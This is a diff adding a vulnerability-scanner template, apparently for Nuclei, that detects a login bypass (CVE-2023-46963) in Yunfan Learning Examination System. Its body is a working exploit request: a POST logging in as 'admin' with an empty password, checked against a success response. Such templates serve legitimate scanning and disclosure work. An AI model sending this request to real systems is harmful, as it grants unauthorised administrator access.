@@ -1,0 +1,32 @@
+id: yunfan-learning-examination-system-login-bypass
+info:
+  name: Yunfan Learning Examination System Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: input-validation,cve-2023-46963
+  description: |
+    This template detects improper input validation in Yunfan Learning Examination System, leading to potential login bypass.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/sys/user/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"smsCode":"","captchaKey":"","captchaValue":"","username":"admin","password":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"code\":0,"
+          - "\"msg\":\"操作成功！\""
+          - "\"success\":true"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
